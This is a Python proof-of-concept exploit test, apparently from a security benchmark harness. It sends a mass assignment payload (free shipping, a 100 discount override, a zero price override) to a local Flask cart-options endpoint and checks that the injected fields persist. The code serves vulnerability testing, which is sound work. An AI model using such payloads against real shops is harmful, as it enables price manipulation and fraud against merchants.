"""PoC exploit: Mass assignment via SQLAlchemy flag_modified on Cart JSON options (CWE-915).

After the 3-stage chain, PUT /api/cart/<id>/options persists arbitrary
user-controlled JSON into the database. An attacker can inject pricing
override fields (free_shipping, discount_override, price_override) that
the application may later trust when processing the cart.

The PoC:
1. GET initial options (should be {})
2. PUT with mass assignment payload (free_shipping, discount_override, price_override)
3. GET again — verify the injected fields persisted
"""

from mosaic.oracle.exploit import ExploitTest


class CartOptionsExploit(ExploitTest):
    """Mass assignment via flag_modified on Cart JSON options field."""

    def __init__(self, base_url: str = "http://localhost:5205"):
        super().__init__(base_url)

    @property
    def chain_id(self) -> str:
        return "flask_cart_flag_modified"

    def setup(self) -> None:
        """Verify the Flask app is reachable."""
        resp = self.http_get("/")
        if not resp.ok:
            raise ConnectionError(f"Flask app not reachable: HTTP {resp.status_code}")

    def execute(self) -> tuple[bool, str]:
        """PUT mass assignment payload and verify persistence."""
        # Step 1: GET initial options (should be empty {})
        resp = self.http_get("/api/cart/1/options")
        if resp.status_code == 404:
            return False, "Cart options endpoint not found (stage 1 not applied)"
        initial = resp.json()

        # Step 2: PUT with mass assignment payload
        payload = {
            "free_shipping": True,
            "discount_override": 100,
            "price_override": 0,
            "gift_wrap": True,
        }
        resp = self.http_put("/api/cart/1/options", json=payload)
        if resp.status_code == 404:
            return False, "PUT endpoint not found (stage 2 not applied)"
        if resp.status_code == 405:
            return False, "PUT method not allowed (stage 2 not applied)"
        put_result = resp.json()

        # Step 3: GET again to verify persistence
        resp = self.http_get("/api/cart/1/options")
        verified = resp.json()

        evidence = [
            f"Initial: {initial}",
            f"PUT response: {put_result}",
            f"After GET: {verified}",
        ]

        vuln = False
        if verified.get("free_shipping") is True:
            evidence.append("free_shipping: true persisted — shipping bypass stored")
            vuln = True
        if verified.get("price_override") == 0:
            evidence.append("price_override: 0 persisted — price manipulation stored")
            vuln = True
        if verified.get("discount_override") == 100:
            evidence.append("discount_override: 100 persisted — discount override stored")
            vuln = True

        if vuln:
            return True, (
                f"Mass assignment via flag_modified cart options (CWE-915). "
                + " ".join(evidence)
            )

        # Check if PUT response had data but GET didn't (stage 3 missing)
        if put_result.get("free_shipping") is True and verified.get("free_shipping") is not True:
            return False, (
                "PUT response shows data but GET doesn't reflect — "
                "flag_modified not applied (stage 3 missing). "
                + " ".join(evidence)
            )

        return False, "Cart options changes did not persist. " + " ".join(evidence)
